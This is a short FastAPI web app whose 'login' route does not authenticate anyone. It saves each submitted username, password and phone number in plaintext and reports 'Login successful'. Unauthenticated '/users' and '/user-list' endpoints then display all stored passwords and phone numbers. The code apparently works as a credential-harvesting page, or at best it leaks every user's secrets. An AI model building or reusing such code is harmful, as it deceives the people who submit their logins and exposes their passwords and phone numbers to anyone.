import jinja2
from fastapi import FastAPI, Form, Depends, HTTPException, status
from fastapi.templating import Jinja2Templates
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.security import OAuth2PasswordBearer
from starlette.requests import Request
from sqlalchemy.orm import Session
from database import init_db, SessionLocal, User

init_db()
app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="static/templates")


def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})


@app.post("/login")
async def login(username: str = Form(...), password: str = Form(...), phone_number: str = Form(...),
                db: Session = Depends(get_db)):
    try:
        if db.query(User).filter(User.username == username).first():
            raise HTTPException(status_code=400, detail="Username already exists")

        # Save the login credentials to the database
        db_user = User(username=username, password=password, phone_number=phone_number)
        db.add(db_user)
        db.commit()

        return {"message": "Login successful"}
    except HTTPException as e:
        print(f"HTTPException: {e}")
        raise
    except Exception as e:
        print(f"Unexpected Exception: {e}")
        raise


@app.get("/users", response_class=JSONResponse)
async def get_users(db: Session = Depends(get_db)):
    users = db.query(User).all()
    user_list = [{"username": user.username, "password": user.password, "phone_number": user.phone_number} for user in users]
    return {"users": user_list}


@app.get("/user-list", response_class=HTMLResponse)
async def user_list(request: Request, db: Session = Depends(get_db)):
    users = db.query(User).all()
    return templates.TemplateResponse("user_list.html", {"request": request, "users": users})

